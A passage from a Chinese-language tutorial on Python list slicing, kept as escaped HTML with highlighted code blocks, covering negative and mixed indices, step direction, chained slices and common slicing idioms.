&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;d-start_index和end_index全为负-索引的情况&#34;&gt;d. start_index和end_index全为负（-）索引的情况&lt;/h3&gt;
&lt;p&gt;step=1，从左往右取值，而start_index=-1到end_index=-6决定了从右往左取值，两者矛盾，所以为空。
索引-1在-6的右边&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，从右往左取值，start_index=-1到end_index=-6同样是从右往左取值。
索引-1在6的右边&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，从左往右取值，而start_index=-6到end_index=-1同样是从左往右取值。
索引-6在-1的左边&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，从左往右取值，从起点开始一直取到end_index=-6（该点不包括）。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，从右往左取值，从终点开始一直取到end_index=-6（该点不包括）。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=1，从左往右取值，从start_index=-6开始，一直取到终点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;step=-1，从右往左取值，从start_index=-6开始，一直取到起点。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;e-start_index和end_index正负-混合索引的情况&#34;&gt;e. start_index和end_index正（+）负（-）混合索引的情况&lt;/h3&gt;
&lt;p&gt;start_index=1在end_index=-6的左边，因此从左往右取值，而step=1同样决定了从左往右取值，因此结果正确&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;start_index=1在end_index=-6的左边，因此从左往右取值，但step=-则决定了从右往左取值，两者矛盾，因此为空。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;start_index=-1在end_index=6的右边，因此从右往左取值，但step=1则决定了从左往右取值，两者矛盾，因此为空。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;start_index=-1在end_index=6的右边，因此从右往左取值，而step=-1同样决定了从右往左取值，因此结果正确。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;f-多层切片操作&#34;&gt;f. 多层切片操作&lt;/h3&gt;
&lt;p&gt;理论上可无限次多层切片操作，只要上一次返回的是非空可切片对象即可。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 相当于：&lt;/span&gt;
a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;][-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;g-切片操作的三个参数可以用表达式&#34;&gt;g. 切片操作的三个参数可以用表达式&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 即：a[2+1:3*2:7%3] = a[3:6:1]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;h-其他对象的切片操作&#34;&gt;h. 其他对象的切片操作&lt;/h3&gt;
&lt;p&gt;前面的切片操作以list对象为例进行说明，但实际上可进行切片操作的数据类型还有很多，包括元组、字符串等等。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ABCDEFG&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[::&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ACEG&amp;#39;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4常用切片操作&#34;&gt;4.常用切片操作&lt;/h2&gt;
&lt;h3 id=&#34;a取偶数位置&#34;&gt;a.取偶数位置&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;[::&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;b取奇数位置&#34;&gt;b.取奇数位置&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;::&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;c拷贝整个对象&#34;&gt;c.拷贝整个对象&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-ruby&#34; data-lang=&#34;ruby&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt;b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; a&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;:&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
